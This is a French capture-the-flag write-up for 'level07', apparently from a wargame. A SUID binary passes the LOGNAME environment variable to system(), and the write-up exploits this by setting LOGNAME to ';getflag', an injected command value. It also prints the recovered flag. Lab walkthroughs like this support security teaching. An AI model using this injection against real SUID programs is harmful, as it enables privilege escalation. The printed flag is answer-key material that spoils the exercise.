# level07

## Contexte

On trouve un exécutable `level07` dans le home de `level07`.

## Recherche

On regarde les permissions :

```bash
ls -l level07
```

Le binaire appartient à `flag07` et possède le bit **SUID**.

On analyse ensuite le binaire avec `strings` :

```bash
strings level07
```

On remarque qu'il utilise la variable d'environnement :

```text
LOGNAME
```

Cette variable est ensuite utilisée dans une commande exécutée avec `system()`.

## Vulnérabilité

Le programme fait confiance au contenu de la variable d'environnement `LOGNAME`.

Comme cette variable est contrôlée par l'utilisateur et utilisée dans un appel à `system()`, il est possible d'injecter une commande.

Le binaire étant SUID, cette commande sera exécutée avec les droits de `flag07`.

## Exploitation

On modifie la variable `LOGNAME` pour y placer une commande :

```bash
export LOGNAME=';getflag'
```

On lance ensuite le programme :

```bash
./level07
```

Le programme exécute notre commande et affiche le flag :

```text
fiumuikeil55xe9cu4dood66h
```

## Ressources

- Variables d'environnement
- `system()`
- SUID